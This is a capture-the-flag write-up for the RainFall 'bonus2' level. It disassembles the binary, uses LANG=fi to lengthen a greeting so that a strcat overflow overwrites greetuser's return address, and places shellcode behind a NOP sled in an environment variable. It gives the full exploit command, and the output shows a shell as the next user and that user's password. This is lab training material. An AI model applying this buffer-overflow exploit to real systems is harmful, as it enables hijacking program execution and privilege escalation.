This program checks if 2 args are provided, else it returns
...
0x08048538      cmp dword [arg_8h], 3
0x0804853c      je 0x8048548
0x0804853e      mov eax, 1
0x08048543      jmp 0x8048630		;;end of main
0x08048548      lea ebx, [dest]
...

It then bzero the dest buffer, strncpy the first 0x28 bytes of argv[1] on dest.
Then the first 0x20 bytes of argv[2] on dest + 0x28


With the value of getenv("LANG"), it loads the language global variable, checking the fist 2 bytes.
	>default = 0: "Hello "
	>1: "Hyv\u00e4\u00e4 p\u00e4iv\u00e4\u00e4 "
	>2: "Goedemiddag! "
This branching is important, as it determines how many bytes we'll be able to write on the stack, eventually overwrite the return eip of the greetuser function

Then it writes dest on the stack and calls greetuser.
...
0x08048618      edx = esp
0x0804861a      ebx = [dest]
0x0804861e      eax = 0x13
0x08048623      edi = edx                                                                                             0x08048625      esi = ebx
0x08048627      ecx = eax
0x08048629      rep movsd dword es:[edi],dword ptr [esi]
0x0804862b      sym.greetuser ()
...
In greetuser, a buffer on the stack located at ebp-0x48 is filled with some greetings corresponding with the current LANG, out of the three possibilities, we pick the longest greating: the one with LANG=fi, as to reach the furthest on the stack and overwrite the return eip of greetuser, this is where we can redirect code execution. :
export LANG=fi

When greetuser is called the stack can be setup so its return will pop to our shellcode (placed either on env or argv or the stack), the main problem is to place a reference to our shellcode when leave is called, then ret jumps to it.
We start by storing the shellcode with a nop slide in the environnement :

nasm ./ressources/shellcode.asm
[Upload the resulting ./ressources/shellcode to the vm at /tmp] : cat ../bonus1/flag | clipboard ; scp -P 4242 ./ressources/shellcode bonus2@rainfall:/tmp
export SHELLCODE="`python -c 'import sys; sys.stdout.write("\x90" * 1000)'``cat /tmp/shellcode`"

We then figure out the address of the shellcode using gdb :
bonus2@RainFall:~$ gdb --args ./bonus2 "" ""
[Removed for readability]
(gdb) b main
Breakpoint 1 at 0x804852f
(gdb) run
Starting program: /home/user/bonus2/bonus2 '' ''

Breakpoint 1, 0x0804852f in main ()
(gdb) print ((char**)environ)[0]
$1 = 0xbffff
(gdb) 

Therefore the nop slide starts at 0xbffff507, any return to this address or the 1000 bytes after it will result in the execution of the shellcode. We'll call this address SHELLCODE_ADDR. We'll use SHELLCODE_ADDR + 256 to make sure we land in the nop slide, as the environ's addresses might move a bit. 0xbffff507 + 256 = 0xbffff607


We'll make it so dest contained first 40 bytes of non-zero padding from argv[1], then the address to the shellcode n times such that the address is overwritten on the return address of greetuser, therefore executing the shellcode.
In order to realigned the shellcode address to address boundary, the way we write the address in argv[2] is slighty shifted (by 2 bytes).

So now we design our shell command like this:
./bonus2 "[inject 0x28 = 40 bytes of non-zero padding]" "[inject SHELLCODE_ADDR n times using python][inject a zero byte so that the strcat finishes]"

bonus2@RainFall:~$ ./bonus2 "`python -c 'import sys; sys.stdout.write("A" * 40)'`" "`python -c 'import sys; sys.stdout.write("\xff\xbf\x06\xf6" * 9); sys.stdout.write("\x00" * 1)'`"
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA������������������������
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$ 



